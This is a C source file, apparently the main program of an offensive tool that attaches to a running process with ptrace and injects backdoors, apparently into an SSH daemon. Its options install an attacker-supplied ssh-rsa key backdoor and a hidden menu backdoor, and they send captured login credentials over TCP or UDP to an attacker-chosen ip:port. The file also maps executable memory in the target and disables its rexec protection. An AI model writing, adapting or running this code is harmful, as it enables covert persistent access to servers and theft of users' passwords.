#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include <util.h>
#include <inject.h>
#include <ptrace.h>
#include <config.h>
#include <callcache.h>
#include <backdoor_menu.h>
#include <backdoor_pubkey.h>
#include <backdoor_password.h>

#define NET_EXFIL_TCP 1
#define NET_EXFIL_UDP 2

void banner() {
	char banner_ascii[]=
		"      _______  __________ ___.    _____     _____________  ______\n"
		"    _/  ____/_/  ____|   |   |   _\\ __ )_  _\\__   \\  __  \\/  __  )_ \n"
		"   /\\___   \\/\\___   \\|   '   |  |    /   \\/   _   /   /  /  __/___/_\n"
		"  /    /   /    /    /   |   \\  |   ,    /   /  . |  ___/   \\/     /\n"
		"  \\ _______\\ _______/____|____\\ |___:\\___\\_____/__|   | \\__________\\\n"
		"   \\/       \\/                                    \\___|\n";

	printf("%s\n", banner_ascii);
}

void usage(char *prog) {
		fprintf(stderr,
			" usage: %s [options] <pid>\n\n"
			" valid options:\n"
			"   -p <pubkey>     activate publickey backdoor with pubkey string\n"
			"   -P <key.pub>    activate publickey backdoor with pubkey file\n"
			"   -t <ip:port>    exfiltrate login information over TCP\n"
			"   -u <ip:port>    exfiltrate login information over UDP\n"
			"   -c              only exfiltrate valid logins\n"
			"   -m              activate secret menu backdoor\n"
			"\n", prog
		);
}

int main(int argc, char *argv[]) {
	config_block *config;
	char *pubkey_value = NULL;
	char *passlog_path = NULL;
	char *pubkey_file = NULL;
	int  net_exfil_type = 0;
	int  menu_activate = 0;
	int  c;

	banner();

	if (argc < 2) {
		usage(argv[0]);
		return -1;
	}

 	config = malloc(sizeof(config_block));
	memset(config, 0, sizeof(config_block));

	while((c = getopt(argc-1, argv, "p:P:t:u:mc")) != -1) {
		switch(c) {
			case 'p':
				pubkey_value = optarg;
			break;

			case 'P':
				pubkey_file = optarg;
			break;

			case 't':
				if (!convert_hostport_pair(optarg, &config->ip_addr, (uint16_t*)&config->port))
					error("eh, '%s' is not a valid ip:port pair", optarg);

				config->net_type |= NET_EXFIL_TCP;
			break;

			case 'u':
				if (!convert_hostport_pair(optarg, &config->ip_addr, (uint16_t*)&config->port))
					error("eh, '%s' is not a valid ip:port pair", optarg);

				config->net_type |= NET_EXFIL_UDP;
			break;

			case 'c':
				config->only_log_valid = 1;
			break;

			case 'l':
				passlog_path = optarg;
			break;

			case 'm':
				menu_activate = 1;
			break;
		}
	}

	if (pubkey_file == NULL && pubkey_value == NULL && passlog_path == NULL && menu_activate == 0) {
		usage(argv[0]);
		return -1;
	}

	if (pubkey_value != NULL && pubkey_file != NULL) {
		usage(argv[0]);
		return -1;
	}

	if ((net_exfil_type & NET_EXFIL_TCP) && (net_exfil_type & NET_EXFIL_UDP)) {
		error("can only use one net exfiltration method.");
		return -1;
	}

	// allocate inject context
	inject_ctx *ctx = malloc(sizeof(inject_ctx));

	// init inject context
	inject_ctx_init(ctx, atoi(argv[argc-1]));

	// find rexec_flag
	u64 rexec_flag = inject_resolve_rexec(ctx);
	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 

	// install config memory block
	ctx->config_addr = find_hole(ctx, rexec_flag, 0x1000);

	info("allocating config memory @ 0x%lx", ctx->config_addr);

	_mmap(
		ctx, (void*)ctx->config_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	inject_ctx_map_reload(ctx);

	// install backdoor(s)
	if(config->net_type != 0) {
		backdoor_password_install(ctx);
		inject_ctx_map_reload(ctx);
	}

	if (pubkey_value != NULL || pubkey_file != NULL) {
		if (pubkey_file != NULL) {
			FILE *f = fopen(pubkey_file, "rb");

			if (f == NULL) {
				error("could not open pubkey file ('%s')", pubkey_file);
			}

			char keybuf[2048];
			memset(keybuf, 0, 2048);
			fgets(keybuf, 2047, f);
			fclose(f);

			if(strncmp(keybuf, "ssh-rsa", 7) != 0) {
				error("invalid pubkey specified, we only support ssh-rsa for now");
			}

			strcpy(config->pubkey, keybuf);

			backdoor_pubkey_install(ctx);
		} else {
			if(strncmp(pubkey_value, "ssh-rsa", 7) != 0) {
				error("invalid pubkey specified, we only support ssh-rsa for now");
			}

			strcpy(config->pubkey, pubkey_value);

			backdoor_pubkey_install(ctx);
		}

		inject_ctx_map_reload(ctx);
	}

	if (menu_activate) {
		backdoor_menu_install(ctx);
		inject_ctx_map_reload(ctx);
	}

	mod_banner("finishing install");

	// upload config data
	info("uploading config..");
	_poke(ctx->pid, ctx->config_addr, config, sizeof(config_block));

	// disable rexec
	info("switching off rexec..");
	u32 null_word = 0;
	_poke(ctx->pid, rexec_flag, &null_word, 4);

	// clean upr
	inject_ctx_deinit(ctx);
	callcache_free();

	info("all done!");

	return 0;
}
